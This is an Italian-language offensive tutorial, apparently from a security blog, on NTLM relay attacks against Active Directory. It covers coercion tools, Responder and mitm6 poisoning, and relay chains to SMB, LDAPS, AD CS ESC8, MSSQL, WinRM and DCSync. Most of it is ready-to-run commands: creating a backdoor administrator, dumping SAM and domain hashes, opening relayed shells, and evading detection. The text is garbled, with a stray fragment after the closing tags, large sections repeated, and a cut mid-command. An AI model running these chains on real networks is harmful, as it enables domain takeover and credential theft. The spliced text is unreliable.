La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
@DC01.corp.local

# Porta HTTP alternativa se 80 è occupata

sudo ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp \
\--adcs --template DomainController -smb2support --http-port 8080

```

---

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```

MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp\_cmdshell → RCE

````

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Login al database | Windows Auth abilitata |
| Query dati | Permessi SELECT |
| `xp_cmdshell` → RCE | sysadmin role |
| Lettura file server | `BULK INSERT`, OPENROWSET |

```bash
# Relay verso MSSQL con SOCKS (sessione persistente)
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks

# Oppure con interactive mode
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -i
# → nc 127.0.0.1 11000

# Via proxychains dopo SOCKS
proxychains -q impacket-mssqlclient -no-pass -windows-auth \
  corp.local/admin@10.10.10.30

# Una volta dentro — abilita RCE
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'net user /domain';
````

***

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```
IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo
```

```bash
# Relay verso IMAP (Exchange on-premise)
sudo ntlmrelayx.py -t imap://EXCHANGE_IP -smb2support -i
# → nc 127.0.0.1 11000 → comandi IMAP diretti

# IMAPS (TLS)
sudo ntlmrelayx.py -t imaps://EXCHANGE_IP -smb2support
```

***

### WinRM / WinRMS (`winrm://` / `winrms://`)

**Perché funziona:** WinRM usa HTTP/HTTPS under the hood (porta 5985 / 5986). Come HTTP, non ha signing — il relay NTLM viene accettato. Se l'account relayed ha permessi WinRM sul target, ottieni una shell PowerShell remota.

```bash
# WinRM (porta 5985 — HTTP)
sudo ntlmrelayx.py -t winrm://10.10.10.20 -smb2support -i
# ntlmrelayx stampa la porta → "Started interactive WinRM client shell via TCP on 127.0.0.1:XXXX"
nc 127.0.0.1 XXXX   # → shell cmd/PowerShell

# WinRMS (porta 5986 — HTTPS)
sudo ntlmrelayx.py -t winrms://10.10.10.20 -smb2support -i

# Verifica se WinRM è aperto
nxc winrm 10.10.10.0/24 -u user -p pass

# Una volta ottenuta la shell interattiva
nc 127.0.0.1 5985
# PS C:\> whoami
# PS C:\> net user /domain
```

***

### RPC (`rpc://`)

**Perché funziona:** ntlmrelayx supporta relay verso RPC in modalità TSCH (Task Scheduler). Relay l'autenticazione NTLM verso il servizio Task Scheduler remoto — esegue comandi senza toccare SMB o creare servizi.

```bash
# RPC relay via Task Scheduler (TSCH)
sudo ntlmrelayx.py -t rpc://10.10.10.20 -smb2support -rpc-mode TSCH

# Via named pipe SMB invece di TCP
sudo ntlmrelayx.py -t rpc://10.10.10.20 -smb2support -rpc-mode TSCH -rpc-use-smb \
  -auth-smb corp.local/lowpriv:pass

# Differenza con atexec: RPC relay usa l'autenticazione della vittima invece delle proprie creds
```

***

### DCSYNC (`dcsync://`)

**Perché funziona:** relay diretto verso il servizio DRSUAPI (Directory Replication Service) del DC. ntlmrelayx si connette al NETLOGON service e se l'account relayed ha DCSync rights (Domain Admin, Domain Controllers, o ACL esplicite su `Replicating Directory Changes`), dumpa tutti gli hash NTLM del dominio senza passare da LDAP o SMB.

```bash
# DCSync relay diretto verso il DC
sudo ntlmrelayx.py -t dcsync://10.10.10.5 -smb2support

# Quando arriva relay di un account con DCSync rights:
# [*] Connecting to 10.10.10.5 NETLOGON service
# [*] Netlogon Auth OK
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# Administrator:500:aad3b435...:NThashAdmin:::
# krbtgt:502:aad3b435...:NThashKrbtgt:::

# Combinazione comune: coerci il DC stesso → relay dcsync verso se stesso
# Funziona se il DC non ha EPA e la reflection è possibile
```

***

### SMTP (`smtp://`)

```bash
# Relay verso SMTP — invia email come la vittima
sudo ntlmrelayx.py -t smtp://MAIL_IP -smb2support -i
# → nc 127.0.0.1 25 → comandi SMTP diretti
# → MAIL FROM: vittima@corp.local → phishing interno credibile
```

***

**Riepilogo completo protocolli supportati:**

| Protocollo | Target URI  | Porta   | Impatto principale                     |
| ---------- | ----------- | ------- | -------------------------------------- |
| SMB        | `smb://`    | 445     | Exec, SAM dump, file access            |
| LDAP       | `ldap://`   | 389     | Dump AD, user creation, RBCD           |
| LDAPS      | `ldaps://`  | 636     | RBCD, Shadow Credentials, add computer |
| HTTP       | `http://`   | 80      | ESC8, Exchange, OWA                    |
| HTTPS      | `https://`  | 443     | ESC8 TLS, ADCS, app web                |
| MSSQL      | `mssql://`  | 1433    | Login SQL, xp\_cmdshell                |
| IMAP       | `imap://`   | 143     | Mailbox access                         |
| IMAPS      | `imaps://`  | 993     | Mailbox access TLS                     |
| SMTP       | `smtp://`   | 25      | Send email as victim                   |
| WinRM      | `winrm://`  | 5985    | Shell PowerShell remota                |
| WinRMS     | `winrms://` | 5986    | Shell PowerShell TLS                   |
| RPC        | `rpc://`    | 135+    | Task Scheduler exec                    |
| DCSYNC     | `dcsync://` | 445/135 | Dump hash dominio diretto              |

***

## Decision tree — cosa usi in base a cosa trovi

```
HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap://DC_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps://DC_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp_cmdshell
│           → ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
    └── mitm6 → LDAPS relay → RBCD → getST → DA
```

***

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
```

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
